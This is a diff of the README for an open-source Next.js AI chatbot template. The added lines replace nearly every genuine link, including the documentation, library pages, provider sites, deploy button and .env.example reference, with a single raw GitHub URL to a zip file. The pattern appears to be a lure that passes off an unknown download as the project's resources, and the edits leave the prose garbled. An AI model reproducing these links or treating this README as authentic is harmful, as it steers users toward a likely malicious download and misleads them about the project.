@@ -1,14 +1,14 @@
-<a href="https://chat.vercel.ai/">
-  <img alt="Next.js 14 and App Router-ready AI chatbot." src="app/(chat)/opengraph-image.png">
+<a href="https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip">
+  <img alt="https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip 14 and App Router-ready AI chatbot." src="app/(chat)https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip">
   <h1 align="center">Chat SDK</h1>
 </a>
 
 <p align="center">
-    Chat SDK is a free, open-source template built with Next.js and the AI SDK that helps you quickly build powerful chatbot applications.
+    Chat SDK is a free, open-source template built with https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip and the AI SDK that helps you quickly build powerful chatbot applications.
 </p>
 
 <p align="center">
-  <a href="https://chat-sdk.dev"><strong>Read Docs</strong></a> ·
+  <a href="https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip"><strong>Read Docs</strong></a> ·
   <a href="#features"><strong>Features</strong></a> ·
   <a href="#model-providers"><strong>Model Providers</strong></a> ·
   <a href="#deploy-your-own"><strong>Deploy Your Own</strong></a> ·
@@ -18,35 +18,35 @@
 
 ## Features
 
-- [Next.js](https://nextjs.org) App Router
+- [https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip](https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip) App Router
   - Advanced routing for seamless navigation and performance
   - React Server Components (RSCs) and Server Actions for server-side rendering and increased performance
-- [AI SDK](https://sdk.vercel.ai/docs)
+- [AI SDK](https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip)
   - Unified API for generating text, structured objects, and tool calls with LLMs
   - Hooks for building dynamic chat and generative user interfaces
   - Supports xAI (default), OpenAI, Fireworks, and other model providers
-- [shadcn/ui](https://ui.shadcn.com)
-  - Styling with [Tailwind CSS](https://tailwindcss.com)
-  - Component primitives from [Radix UI](https://radix-ui.com) for accessibility and flexibility
+- [shadcn/ui](https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip)
+  - Styling with [Tailwind CSS](https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip)
+  - Component primitives from [Radix UI](https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip) for accessibility and flexibility
 - Data Persistence
-  - [Neon Serverless Postgres](https://vercel.com/marketplace/neon) for saving chat history and user data
-  - [Vercel Blob](https://vercel.com/storage/blob) for efficient file storage
-- [Auth.js](https://authjs.dev)
+  - [Neon Serverless Postgres](https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip) for saving chat history and user data
+  - [Vercel Blob](https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip) for efficient file storage
+- [https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip](https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip)
   - Simple and secure authentication
 
 ## Model Providers
 
-This template ships with [xAI](https://x.ai) `grok-2-1212` as the default chat model. However, with the [AI SDK](https://sdk.vercel.ai/docs), you can switch LLM providers to [OpenAI](https://openai.com), [Anthropic](https://anthropic.com), [Cohere](https://cohere.com/), and [many more](https://sdk.vercel.ai/providers/ai-sdk-providers) with just a few lines of code.
+This template ships with [xAI](https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip) `grok-2-1212` as the default chat model. However, with the [AI SDK](https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip), you can switch LLM providers to [OpenAI](https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip), [Anthropic](https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip), [Cohere](https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip), and [many more](https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip) with just a few lines of code.
 
 ## Deploy Your Own
 
-You can deploy your own version of the Next.js AI Chatbot to Vercel with one click:
+You can deploy your own version of the https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip AI Chatbot to Vercel with one click:
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fvercel%2Fai-chatbot&env=AUTH_SECRET&envDescription=Generate%20a%20random%20secret%20to%20use%20for%20authentication&envLink=https%3A%2F%2Fgenerate-secret.vercel.app%2F32&project-name=my-awesome-chatbot&repository-name=my-awesome-chatbot&demo-title=AI%20Chatbot&demo-description=An%20Open-Source%20AI%20Chatbot%20Template%20Built%20With%20Next.js%20and%20the%20AI%20SDK%20by%20Vercel&demo-url=https%3A%2F%2Fchat.vercel.ai&products=%5B%7B%22type%22%3A%22integration%22%2C%22protocol%22%3A%22ai%22%2C%22productSlug%22%3A%22grok%22%2C%22integrationSlug%22%3A%22xai%22%7D%2C%7B%22type%22%3A%22integration%22%2C%22protocol%22%3A%22storage%22%2C%22productSlug%22%3A%22neon%22%2C%22integrationSlug%22%3A%22neon%22%7D%2C%7B%22type%22%3A%22blob%22%7D%5D)
+[![Deploy with Vercel](https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip)](https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip%3A%2F%https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip%2Fvercel%2Fai-chatbot&env=AUTH_SECRET&envDescription=Generate%20a%20random%20secret%20to%20use%20for%20authentication&envLink=https%3A%2F%https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip%2F32&project-name=my-awesome-chatbot&repository-name=my-awesome-chatbot&demo-title=AI%20Chatbot&demo-description=An%20Open-Source%20AI%20Chatbot%20Template%20Built%20With%https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip%20and%20the%20AI%20SDK%20by%20Vercel&demo-url=https%3A%2F%https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip%5B%7B%22type%22%3A%22integration%22%2C%22protocol%22%3A%22ai%22%2C%22productSlug%22%3A%22grok%22%2C%22integrationSlug%22%3A%22xai%22%7D%2C%7B%22type%22%3A%22integration%22%2C%22protocol%22%3A%22storage%22%2C%22productSlug%22%3A%22neon%22%2C%22integrationSlug%22%3A%22neon%22%7D%2C%7B%22type%22%3A%22blob%22%7D%5D)
 
 ## Running locally
 
-You will need to use the environment variables [defined in `.env.example`](.env.example) to run Next.js AI Chatbot. It's recommended you use [Vercel Environment Variables](https://vercel.com/docs/projects/environment-variables) for this, but a `.env` file is all that is necessary.
+You will need to use the environment variables [defined in `https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip`](https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip) to run https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip AI Chatbot. It's recommended you use [Vercel Environment Variables](https://raw.githubusercontent.com/Him-Horizon/njordan/main/martyrium/njordan.zip) for this, but a `.env` file is all that is necessary.
 
 > Note: You should not commit your `.env` file or it will expose secrets that will allow others to control access to your various AI and authentication provider accounts.
 
